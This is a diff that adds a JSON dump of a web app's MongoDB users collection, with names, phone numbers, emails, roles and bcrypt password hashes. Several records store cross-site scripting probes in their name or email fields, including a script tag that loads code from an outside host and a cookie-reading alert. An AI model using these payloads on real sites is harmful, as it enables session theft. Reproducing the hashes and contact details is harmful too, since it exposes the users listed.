@@ -1,0 +1,985 @@
+[{
+  "_id": {
+    "$oid": "65dee4b27046bb0545061580"
+  },
+  "name": "User1",
+  "telephone": "0842955499",
+  "email": "user1@gmail.com",
+  "role": "user",
+  "password": "$2a$10$l3OFS4Hn/CVonmvbiN2M9OGN5ImwpumUeC25pab74QpuaAhAGkfqS",
+  "createdAt": {
+    "$date": "2024-02-28T07:45:54.820Z"
+  },
+  "__v": 0,
+  "point": 91
+},
+{
+  "_id": {
+    "$oid": "65e038bb0eaa7851a241b445"
+  },
+  "name": "Rephu",
+  "telephone": "9999999899",
+  "email": "User1@gmail.com",
+  "role": "user",
+  "password": "$2a$10$exq8pVAGbCV9QW951/LBxuWAF/DYLxBXNS18DAEupkeNKLQm3A5au",
+  "createdAt": {
+    "$date": "2024-02-29T07:56:43.715Z"
+  },
+  "__v": 0,
+  "point": 48150
+},
+{
+  "_id": {
+    "$oid": "65e3e939af3756a1eef8fc16"
+  },
+  "name": "Annie Gleichner",
+  "telephone": "600-946-7074",
+  "email": "Morton_Jenkins8@gmail.com",
+  "role": "user",
+  "password": "$2a$10$eM0SZyVQ/tMcMcDgPQyi1u2aOwt/XYcZ5SjkxiS2DH5u936CphSk2",
+  "createdAt": {
+    "$date": "2024-03-03T03:06:33.071Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "65fd3bb46a89ebb29725c87f"
+  },
+  "name": "Courtney Dibbert",
+  "telephone": "630-414-1421",
+  "email": "testuser1@gmail.com",
+  "role": "user",
+  "password": "$2a$10$71e..fUu2FT2ii3mq0//0.i7uRYY2b9iZ8uJRlammRPvs4/nUPeH6",
+  "createdAt": {
+    "$date": "2024-03-22T08:05:08.636Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "65fee0ee8c49fbad97b10bc2"
+  },
+  "name": "Mathew Smith",
+  "telephone": "439-971-7785",
+  "email": "testadmin@gmail.com",
+  "role": "admin",
+  "password": "$2a$10$jReznFiZ7nmlarZ7Jht50.KJIdtJqiS8xin9MdNsX1D72THXR4mcK",
+  "createdAt": {
+    "$date": "2024-03-23T14:02:22.956Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6602f0ebf5e828844d0d5a29"
+  },
+  "name": "phuree",
+  "telephone": "099-999-9999",
+  "email": "phuree@gmail.com",
+  "role": "user",
+  "password": "$2a$10$5f/ZnBh2IUDe5UWszyriM.qNKiuY.sVyAnRbP/wA99xnx0SS0FEfC",
+  "createdAt": {
+    "$date": "2024-03-26T15:59:39.147Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6603a14de7e2eb8236537189"
+  },
+  "name": "kongggy",
+  "telephone": "061-694-5388",
+  "email": "kopmul26@gmail.com",
+  "role": "admin",
+  "password": "$2a$10$Zq4Jt9wBX.XHoT5Zcrt41Of0qaXm/LINW4y94Xb6eE6Q2vqdRZJBK",
+  "createdAt": {
+    "$date": "2024-03-27T04:32:13.516Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6603a36bbcccac0d26b97018"
+  },
+  "name": "kdfodkoerger",
+  "telephone": "011-022-0333",
+  "email": "demo02@gmail.com",
+  "role": "user",
+  "password": "$2a$10$gvJCCRlrcdjP5.a0ADcddeP8Xab5Aqv3bI6FzNiVq6S70igtmFPNq",
+  "createdAt": {
+    "$date": "2024-03-27T04:41:15.969Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6603a7c6a725342d2bb4991d"
+  },
+  "name": "wergfewgewgew",
+  "telephone": "111-222-6666",
+  "email": "demo04@gmail.com",
+  "role": "user",
+  "password": "$2a$10$6OH9UgC1KPpIjLqqwUuB1ugNpJ8xWS1RtLM8dmrIACpZkVt6EL4Ra",
+  "createdAt": {
+    "$date": "2024-03-27T04:59:50.661Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6603b9a21b85abca6488a213"
+  },
+  "name": "kongggynji",
+  "telephone": "111-222-9874",
+  "email": "demo05@gmail.com",
+  "role": "user",
+  "password": "$2a$10$wvOn3B3Yat3O9r3WeQy8Sei7OmUSVWxy/9MrvgYpTl4AnXt29ymt2",
+  "createdAt": {
+    "$date": "2024-03-27T06:16:02.559Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6603bd05cb1b2454985f467e"
+  },
+  "name": "Kongbhumi Subhudhayodhin",
+  "telephone": "0616945388",
+  "email": "Admin2@gmail.com",
+  "role": "user",
+  "password": "$2a$10$V73.KcYIrdcltCfw0L36eOMa3sI9OZWgB8UZaCT1XTIGc845khHz.",
+  "createdAt": {
+    "$date": "2024-03-27T06:30:29.763Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "66163f2903b5871a13b74c0d"
+  },
+  "name": "phurree",
+  "telephone": "000000000000000",
+  "email": "phureeXD@gmail.com",
+  "role": "user",
+  "point": 20,
+  "password": "$2a$10$b//BnbbDqjFHuqQgN6ozhe/xvyJCW0Eqaavw8n.8oc36KpHfoPnWO",
+  "createdAt": {
+    "$date": "2024-04-10T07:26:33.072Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "66165941b9c8828622956fda"
+  },
+  "name": "Art",
+  "telephone": "4818547341",
+  "email": "Art@gmail.com",
+  "role": "user",
+  "point": 387,
+  "password": "$2a$10$dDFF.X9G/fXToONRTSCqbubpFaj43cdLxBR2woleOt5Cg1H0X9whO",
+  "createdAt": {
+    "$date": "2024-04-10T09:17:53.269Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6616a7efc531530cd3dbac8e"
+  },
+  "name": "tuck",
+  "telephone": "0994421494",
+  "email": "pantana2004@gmail.com",
+  "role": "user",
+  "point": {
+    "$numberLong": "10000000140"
+  },
+  "password": "$2a$10$6NgvWJMes18/g0L8ON8J8ubKm92t0ltfuWLXmO2NFlJKy2rDciZIG",
+  "createdAt": {
+    "$date": "2024-04-10T14:53:35.399Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "66184d2050fb82b759540e9b"
+  },
+  "name": "Poll",
+  "telephone": "0987654322",
+  "email": "Poll@gmail.com",
+  "role": "user",
+  "point": {
+    "$numberLong": "7000029770"
+  },
+  "password": "$2a$10$HJ02hxlXGNtvC/zEhbWqrOLM6vds5ArsCrIsYlDToB4HNs1I0h27O",
+  "createdAt": {
+    "$date": "2024-04-11T20:50:40.862Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6627e311162e46fe2c01bb94"
+  },
+  "name": "Mr. Joyce Beahan",
+  "telephone": "606-885-2622",
+  "email": "Joanny6@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$xhlPlaT6A573h9CRuZDECe9EMEpVqPYbJM5wXtGfLuBHobjJRAuPC",
+  "createdAt": {
+    "$date": "2024-04-23T16:34:25.514Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6627e7c4162e46fe2c01bb96"
+  },
+  "name": "Test",
+  "telephone": "0999999999",
+  "email": "info@primerental.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$tbUz33hY6F1KQdCL8sFxheDa.0b6z/4FcDR4bHJheeXuMQUDMba9e",
+  "createdAt": {
+    "$date": "2024-04-23T16:54:28.016Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "66280e5e3c4253c0a1caa93d"
+  },
+  "name": "adadad",
+  "telephone": "0999999992",
+  "email": "customerRR56@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$jcG3TSN4JEfkUPjIBzPDLew1CwWcUZCpInM97bpFAkoQ94fFaj3N2",
+  "createdAt": {
+    "$date": "2024-04-23T19:39:10.058Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6628761cbc6be3e71ad6e344"
+  },
+  "name": "LOL",
+  "telephone": "0588706427",
+  "email": "lol@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$qDr0AGlV9Pabtp.yQfc1nOAHvOFujo6mTwbsI7H4MtVp0mKZisaQe",
+  "createdAt": {
+    "$date": "2024-04-24T03:01:48.081Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662876b9bc6be3e71ad6e353"
+  },
+  "name": "ipt&gt;alert('lol noob')/ipt&gt;",
+  "telephone": "5078461611",
+  "email": "lol2@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$fG9peXwQ01lYkqzJg/hFcOF0IpCdtkP00dwbYEYif6YRHFodYfqPG",
+  "createdAt": {
+    "$date": "2024-04-24T03:04:25.451Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6628770cbc6be3e71ad6e35c"
+  },
+  "name": "&lt;&lt;&lt;&gt;&gt;&gt;",
+  "telephone": "8078767157",
+  "email": "lol3@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$cNG0R3YRlCeSG74BT3OLeOqb07Jbv1U3b4ZjTqdJ3gXLEEuZic2xS",
+  "createdAt": {
+    "$date": "2024-04-24T03:05:48.257Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6628776bbc6be3e71ad6e365"
+  },
+  "name": "&lt;&lt;&lt;{&lt;: -1}&gt;&gt;&gt;ipt&gt;alert('lol noob')/ipt&gt;",
+  "telephone": "8725897724",
+  "email": "lol4@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$.JJQZYHoF9rIkk/CvLN99.NpUmgklhTbmoLFbxJqmHfaCIVycj.pu",
+  "createdAt": {
+    "$date": "2024-04-24T03:07:23.651Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "66287854bc6be3e71ad6e36e"
+  },
+  "name": "scriptor",
+  "telephone": "0787548767",
+  "email": "lol5@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$mwOJG4k.djWhXd7wIF/vX.YUnmoJ.Wtow1DFmFj5u0W8pCPUCQKZm",
+  "createdAt": {
+    "$date": "2024-04-24T03:11:16.847Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662878d9bc6be3e71ad6e377"
+  },
+  "name": "%3%3E",
+  "telephone": "6387764567",
+  "email": "lol6@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$GBtEsgrRBRn8PadkoS24HO6.DjgrYgPp4fcJBJgKiCm7XLlhgr3Tm",
+  "createdAt": {
+    "$date": "2024-04-24T03:13:29.547Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "66287930bc6be3e71ad6e380"
+  },
+  "name": "&gt;",
+  "telephone": "5078678453",
+  "email": "lol7@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$9Kp/ekpAYBj1kVuiuhMgDeyvJOD0z7E8JcteScZsDtv4dRf9W6mlm",
+  "createdAt": {
+    "$date": "2024-04-24T03:14:56.817Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "66287961bc6be3e71ad6e38a"
+  },
+  "name": "%3Cscript%20src%3D\"%2Fbin%2Fbash%20-i\"%3Ealert(\"Success!\");%3C/script%3E",
+  "telephone": "8706741378",
+  "email": "lol8@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$eQTek1ccYK6MtCVI3yK4LOAI8lHqIhtfxqltYTkx25Sh6jkHYjfAS",
+  "createdAt": {
+    "$date": "2024-04-24T03:15:45.143Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "66287b459d1b7efb9701dd99"
+  },
+  "name": "perl -e 'print \"\";' &gt; out",
+  "telephone": "6830898565",
+  "email": "lel@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$MvxqVNh28qHgApTyRGXQBuT5.KWFwqECPchE.jK2MigaAlFxX4ek2",
+  "createdAt": {
+    "$date": "2024-04-24T03:23:49.175Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "66287e70bcfc4f4b9734569b"
+  },
+  "name": "</h2><script>alert(\"Success! I have now bypassed the XSS security!\");</script>",
+  "telephone": "8965428874",
+  "email": "<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>",
+  "role": "user",
+  "point": 77,
+  "password": "$2a$10$ffQDfe97AOs0O1gsy4vtVe/Edx1UVIz7DnjOMEWKo0PskHQ74NzRq",
+  "createdAt": {
+    "$date": "2024-04-24T03:37:20.640Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6628863a5b002dd915079c79"
+  },
+  "name": "&LT",
+  "telephone": "54761477674",
+  "email": "lel4@gail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$Ob/DdO1pr3F8AhqzgjmpUOpfEwXp43ginrioy7GWWP3WS7do0fi5C",
+  "createdAt": {
+    "$date": "2024-04-24T04:10:34.782Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6628a3699da96626ff941194"
+  },
+  "name": "javascript:",
+  "telephone": "5087784531",
+  "email": "lel5@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$mIsct8LgfhqesQB16aXem.gxu1fBX7pp4Rc5JVxnqS3JuVXE0kVE6",
+  "createdAt": {
+    "$date": "2024-04-24T06:15:05.722Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6628a3a79da96626ff94119d"
+  },
+  "name": "\\alert(document.cookie)\\",
+  "telephone": "3547867456",
+  "email": "lel6@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$koV01DuPWeRDQMNPSaU0TeKBv.yMAjVYZxIkHYVbQKVUtxojWIfs6",
+  "createdAt": {
+    "$date": "2024-04-24T06:16:07.154Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "6628a6749da96626ff9411ba"
+  },
+  "name": "&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;",
+  "telephone": "2425445467",
+  "email": "lel8@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$eFiUkMFYbwAI6TRVBxeIVOBS8NjChs3lChzRbZuMJAMuyzKjBhvFu",
+  "createdAt": {
+    "$date": "2024-04-24T06:28:04.252Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "66290c21dfd4b53c5af58753"
+  },
+  "name": "tuck",
+  "telephone": "098-999-9999",
+  "email": "tuck@gmail.com",
+  "role": "user",
+  "point": 126,
+  "password": "$2a$10$L0RO44A38t1T8ISI9jHd.eLb6ghXB6oeBxBNWDl7n1czFMQ7qUsgu",
+  "createdAt": {
+    "$date": "2024-04-24T13:41:53.136Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662b405ffdfeb89e83f51f8c"
+  },
+  "name": "wa12",
+  "telephone": "0842955494",
+  "email": "wa12@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$C949iZuCJ1pyyT7Lp8BX4e4N0h570VAtGtzMgYXfLepxi4Y9zU7Oq",
+  "createdAt": {
+    "$date": "2024-04-26T05:49:19.173Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662b6ee7eeb3370cdc8d49af"
+  },
+  "name": "konglnwza",
+  "telephone": "0998887772",
+  "email": "kongkong@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$a6yeVsG29aL72bazVOqvoe9f6WlOvBpzm0UHBLiSzPyqlUREQoKni",
+  "createdAt": {
+    "$date": "2024-04-26T09:07:51.937Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662badda731597032a23a125"
+  },
+  "name": "tantana",
+  "telephone": "0998888989",
+  "email": "tantana2004@gmail.com",
+  "role": "user",
+  "point": 34,
+  "password": "$2a$10$4e5W0edjs0X0Eo1CYxrJBukBZSAZaCmf0GIa9bydIX.52whnOjNAm",
+  "createdAt": {
+    "$date": "2024-04-26T13:36:26.050Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662bb2b4731597032a23ac48"
+  },
+  "name": "kong",
+  "telephone": "0559999988",
+  "email": "kongxoxo@gmail.com",
+  "role": "user",
+  "point": 35,
+  "password": "$2a$10$3e8rstd8.OO2NEZ/o87q0eQugVrSGmjjQYq7HbcGq/xF6VCv8VL5K",
+  "createdAt": {
+    "$date": "2024-04-26T13:57:08.438Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662bb3b2731597032a23ac8f"
+  },
+  "name": "zootuck",
+  "telephone": "0853584113",
+  "email": "zootuck@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$l5qNAVzXAvoURfw10acRuuzkFU9l.iQ5R06xDiSJtFIP6JMWn7hXy",
+  "createdAt": {
+    "$date": "2024-04-26T14:01:22.644Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662c92d99f5ff05f30971fa3"
+  },
+  "name": "LOLLOL",
+  "telephone": "5457867754",
+  "email": "12345@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$LLbN4XjkGVhutHCbI13C9uJV2ywAa4m5IYU/Jk.fFubciBTYMDTpG",
+  "createdAt": {
+    "$date": "2024-04-27T05:53:29.719Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662c93329f5ff05f30971fa5"
+  },
+  "name": "1234",
+  "telephone": "5647861345",
+  "email": "124214@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$E3JlG1UxN/.gimjnY9OhTOOmUD641mlY9x1hWipzAsCnILgUP6qfK",
+  "createdAt": {
+    "$date": "2024-04-27T05:54:58.080Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662c934e9f5ff05f30971fa7"
+  },
+  "name": "dawaddawd",
+  "telephone": "5456875145",
+  "email": "dawdawawd@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$v7D420uabRR3gDbZhhqZz.03scbKh8rC6sauHS2atuj/uhKqrAqpu",
+  "createdAt": {
+    "$date": "2024-04-27T05:55:26.953Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662c95049f5ff05f30971fad"
+  },
+  "name": "awdawd",
+  "telephone": "4564871536",
+  "email": "awdawd@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$GwAGVevXc/IParMXVik3k..jbaTW9aKaQ98rVFwhvWyrsdSzm4Rda",
+  "createdAt": {
+    "$date": "2024-04-27T06:02:44.471Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662c95759f5ff05f30971faf"
+  },
+  "name": "dawd",
+  "telephone": "1234587452",
+  "email": "faw@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$6wB4AIFr2tK6FmBl1kZiuukAk9euRNq.ZL45bOH3EMe6eNsbqUO36",
+  "createdAt": {
+    "$date": "2024-04-27T06:04:37.854Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662c95be9f5ff05f30971fb1"
+  },
+  "name": "dawwadwa",
+  "telephone": "1235467875",
+  "email": "t4oitli@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$QG0UwJqQZuN3YhKxf3v2cOLtl6EATruVmApM9VRJlix0gPOsQ0Zuq",
+  "createdAt": {
+    "$date": "2024-04-27T06:05:50.957Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662c95d99f5ff05f30971fb3"
+  },
+  "name": "56t34tes",
+  "telephone": "5687431481",
+  "email": "fmlkqwj@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$wcAO.7bZFLNvuVoVfOrjI.Kci7pOURj5.zKgXl0B6MLgmBJgbXNYa",
+  "createdAt": {
+    "$date": "2024-04-27T06:06:17.066Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662c963b9f5ff05f30971fb5"
+  },
+  "name": "3r2rwawa",
+  "telephone": "4565481538",
+  "email": "fskla@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$kpmiZpygOwZG3b5r4U/Dce8PRinEqpzdC7JStFYuck/.A9WXGUNVa",
+  "createdAt": {
+    "$date": "2024-04-27T06:07:55.657Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662c96929f5ff05f30971fb8"
+  },
+  "name": "gesges",
+  "telephone": "5653655888",
+  "email": "ergtstgse@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$JpjqX2EP6sWy227HIli8O.01qnJm5HCoZmesBCnsWHQVBLt6js7LC",
+  "createdAt": {
+    "$date": "2024-04-27T06:09:22.610Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662c98229f5ff05f30971fe0"
+  },
+  "name": "wdawadwda",
+  "telephone": "29aiodadwa",
+  "email": "dawdwa@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$vSekZYolSBDdoxTDhvCds.SSzqBL.rRT4tXViTiYRePgEbBTok9Aa",
+  "createdAt": {
+    "$date": "2024-04-27T06:16:02.344Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662c99e39f5ff05f30971ff0"
+  },
+  "name": "dawdaw",
+  "telephone": "4-93058345",
+  "email": "dawdwawad@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$83LT90GPJBV9P3H7.9B52u4jAPilsDaognEINDnKmX9nzW.P1bx2O",
+  "createdAt": {
+    "$date": "2024-04-27T06:23:31.508Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662c9a6c9f5ff05f30971ff2"
+  },
+  "name": "awdawawd",
+  "telephone": "8468544565",
+  "email": "dwk23d@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$x3KjTj2LL4hvcGNRFXEDzeUpkXJykuab.B.CMo0zoe4RtyEJZgLJO",
+  "createdAt": {
+    "$date": "2024-04-27T06:25:48.882Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662cb654473da3e13d6f4dd9"
+  },
+  "name": "dsdes",
+  "telephone": "dawawdawddwa",
+  "email": "dasdaw@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$4QgfneioA0uEuT3BLsiRfeFhEhDj6asEYsFmn2GTLaJ6iejse0472",
+  "createdAt": {
+    "$date": "2024-04-27T08:24:52.400Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662cb6b7473da3e13d6f4de0"
+  },
+  "name": "fawafwa",
+  "telephone": "5454334235",
+  "email": "dawwafwag@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$zAu1pxSisl6EsjxlKyREk.jPqGdeNU/.BZlQTpH1oWWC6o4DEEBtm",
+  "createdAt": {
+    "$date": "2024-04-27T08:26:31.852Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662cb86a473da3e13d6f4de2"
+  },
+  "name": "dwadwafaw",
+  "telephone": "3544ad5343",
+  "email": "awdil@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$QtMtMpA7.hWA7GOUPaBQhefTbR9Md8408O8fwbsrLxjETVBB1aMIe",
+  "createdAt": {
+    "$date": "2024-04-27T08:33:46.111Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662cb9ae2811747034a193c2"
+  },
+  "name": "flisalfwa",
+  "telephone": "3240892112",
+  "email": "waf@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$7a9omfB0TU1.mg2muPgEOenkhb3Vv6QFMW6wNGBFzIs9rHB8qzvfC",
+  "createdAt": {
+    "$date": "2024-04-27T08:39:10.646Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662cbce069160951c90d9c0c"
+  },
+  "name": "test123",
+  "telephone": "4546463666",
+  "email": "test123@gmail.com",
+  "role": "user",
+  "point": 304,
+  "password": "$2a$10$ym1b/aYektYgw9gpigzTuOPtm1YZpY36a81ejHEPiFPNMs4hNghwa",
+  "createdAt": {
+    "$date": "2024-04-27T08:52:48.700Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662cbe967cc3617a4ec6af07"
+  },
+  "name": "faklwa",
+  "telephone": "3-9253-29-",
+  "email": "wfklwj@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$z1TiIQMagWn1S1eINFDCEODACcnuzNAJsRiOS/eRzRADdTk3MX5qe",
+  "createdAt": {
+    "$date": "2024-04-27T09:00:06.197Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662cbeb37cc3617a4ec6af09"
+  },
+  "name": "dwdwa",
+  "telephone": "3243294023",
+  "email": "testtesttest@gmail.com",
+  "role": "user",
+  "point": 89,
+  "password": "$2a$10$2/AmMjrwqCTTPnPvS0omwelFUmIKkm5.xZs3Oa6LXXaBQjadmSoGq",
+  "createdAt": {
+    "$date": "2024-04-27T09:00:35.463Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662ce086d1506f50d950600a"
+  },
+  "name": "Penny Von",
+  "telephone": "770-774-4857",
+  "email": "Gerda.Upton@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$WFqJe6tx32JjQue6TVcnPOXjt9idzb8y.WqgKs5NMQG3ey6OOQLh.",
+  "createdAt": {
+    "$date": "2024-04-27T11:24:54.717Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662e1c0a308b5ae4540a848b"
+  },
+  "name": "Admin1",
+  "telephone": "0800888888",
+  "email": "Admin1@gmail.com",
+  "role": "admin",
+  "point": 596,
+  "password": "$2a$10$uo4v4LEhSr2MNtFqXlIcqOpD0GsVQTDO1gSNpHVPH/Re3PDjTcYT6",
+  "createdAt": {
+    "$date": "2024-04-28T09:51:06.926Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662e51ceb64ae61188c43dc7"
+  },
+  "name": "Sheryl McClure",
+  "telephone": "1234567890",
+  "email": "l@email.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$QrdikUOhFcDchPjslnvghehtFwFn.AXKXUogkNP5Xlz3QQMHJ/b.e",
+  "createdAt": {
+    "$date": "2024-04-28T13:40:30.358Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662e51f2b64ae61188c43dc9"
+  },
+  "name": "Miss Edgar Schneider",
+  "telephone": "827-542-1689",
+  "email": "Barry.Walter30@gmail.com",
+  "role": "admin",
+  "point": 0,
+  "password": "$2a$10$GsjUXEgEqfxW2NO6VrGucOGSdM.wXkm/BPHarRQ.kY65dG9HGeZZ.",
+  "createdAt": {
+    "$date": "2024-04-28T13:41:06.957Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662e52e4adb3e9c755593060"
+  },
+  "name": "Melvin Gerlach",
+  "telephone": "892-726-5906",
+  "email": "Elyssa81@gmail.com",
+  "role": "admin",
+  "point": 0,
+  "password": "$2a$10$bacquD5TrQh7ZA5BIvhlm.2DVJGI9Xtmzt70DCN/PrXgHN00j0L1K",
+  "createdAt": {
+    "$date": "2024-04-28T13:45:08.935Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662e58e6ab25cc9a37a9f34a"
+  },
+  "name": "Mike Kirlin",
+  "telephone": "439-481-7346",
+  "email": "Sabrina.Stiedemann43@yahoo.com",
+  "role": "admin",
+  "point": 0,
+  "password": "$2a$10$IvW/Bt1ruG5ZYISWBylWkOcDAVG3VKppQGQCviPIzvg491tHIBCtK",
+  "createdAt": {
+    "$date": "2024-04-28T14:10:46.149Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662e59667a0d7c3da650c8a5"
+  },
+  "name": "Henry Ritchie",
+  "telephone": "235-259-8854",
+  "email": "Zola12@gmail.com",
+  "role": "admin",
+  "point": 0,
+  "password": "$2a$10$GTxEY2PJuzjrBGhFvJL40eurcwUnchXDJQGTjbbKH9X5I3Klph/oG",
+  "createdAt": {
+    "$date": "2024-04-28T14:12:54.920Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662e643a78e06c798c79717b"
+  },
+  "name": "Kari Kshlerin",
+  "telephone": "969-386-6273",
+  "email": "Alexys.Wilderman@yahoo.com",
+  "role": "admin",
+  "point": 0,
+  "password": "$2a$10$tZAtGSZAicYBzSLlxa/b4emvs.q1LdAwocrUo.BuLAx48E2M4QyTu",
+  "createdAt": {
+    "$date": "2024-04-28T14:59:06.376Z"
+  },
+  "__v": 0
+},
+{
+  "_id": {
+    "$oid": "662f404a258308c51aa96750"
+  },
+  "name": "tst",
+  "telephone": "0998887766",
+  "email": "hello1@gmail.com",
+  "role": "user",
+  "point": 0,
+  "password": "$2a$10$vTaXoPmLaqyGvZDi2jLVUeobpfaGjOMRhBGe7JyAQOUdnLj3OqPnS",
+  "createdAt": {
+    "$date": "2024-04-29T06:38:02.972Z"
+  },
+  "__v": 0
+}]
